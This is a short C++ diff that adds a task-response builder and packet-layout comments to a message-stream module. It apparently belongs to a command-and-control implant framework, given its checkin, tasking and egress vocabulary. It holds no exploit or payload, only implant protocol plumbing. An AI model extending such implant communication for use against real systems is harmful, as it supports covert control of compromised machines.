@@ -25,9 +25,21 @@ namespace Stream {
         return buffer[0] | (buffer[1] << 8) | (buffer[2] << 16) | (buffer[3] <<24);
     }
 
-    _stream * CreateStreamWithHeaders(uint32_t msg_type) {
-
+    _stream* CreateTaskResponse(uint32_t cmd_id) {
         HEXANE
+
+        auto stream = CreateStreamWithHeaders(TypeResponse);
+        Stream::PackDword(stream, cmd_id);
+        return stream;
+    }
+
+    _stream * CreateStreamWithHeaders(uint32_t msg_type) {
+        HEXANE
+
+        // response will be [in/out], pid, tid, msg_type, cmd_type, msg_length, msg_buffer
+        // tasking will be  [in/out], pid, tid, msg_type
+        // checkin will be  [in/out], pid, tid, msg_type
+
         _stream *stream = CreateStream();
         Stream::PackByte(stream, EGRESS);
         Stream::PackDword(stream, Ctx->session.peer_id);
